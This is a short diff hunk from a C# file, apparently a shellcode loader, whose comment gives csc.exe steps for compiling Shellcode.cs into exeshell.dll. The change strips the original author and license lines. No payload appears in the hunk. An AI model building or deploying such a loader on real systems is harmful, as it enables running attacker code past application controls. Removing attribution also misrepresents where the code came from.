@@ -27,8 +27,6 @@ using System.Configuration.Install;
 using System.Runtime.InteropServices;
 
 /*
-Author: Casey Smith, Twitter: @subTee
-License: BSD 3-Clause
 Step One:
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /platform:x86 /out:exeshell.dll /target:library Shellcode.cs
 Step Two:
